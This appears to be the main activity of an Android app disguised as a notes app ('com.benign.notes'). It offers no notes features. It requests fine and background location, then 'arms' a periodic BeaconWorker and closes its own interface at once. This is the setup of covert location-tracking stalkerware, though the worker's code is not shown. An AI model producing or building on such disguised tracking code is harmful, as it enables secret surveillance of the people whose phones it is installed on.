package com.benign.notes

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        checkPermissionsAndStart()
    }

    private fun checkPermissionsAndStart() {
        val fineLoc = ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
        
        if (fineLoc != PackageManager.PERMISSION_GRANTED) {
            // Request Foreground Location first
            ActivityCompat.requestPermissions(
                this, 
                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION), 
                100
            )
        } else {
            checkBackgroundPermission()
        }
    }

    private fun checkBackgroundPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val bgLoc = ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            if (bgLoc != PackageManager.PERMISSION_GRANTED) {
                // Request Background Location for Android 10+
                ActivityCompat.requestPermissions(
                    this, 
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 
                    101
                )
                return
            }
        }
        armTracker()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            checkBackgroundPermission()
        } else if (requestCode == 101) {
            armTracker()
        }
    }

    private fun armTracker() {
        // Enqueue the periodic background worker
        BeaconWorker.schedule(applicationContext)
        // Close the app interface immediately
        finish()
    }
}
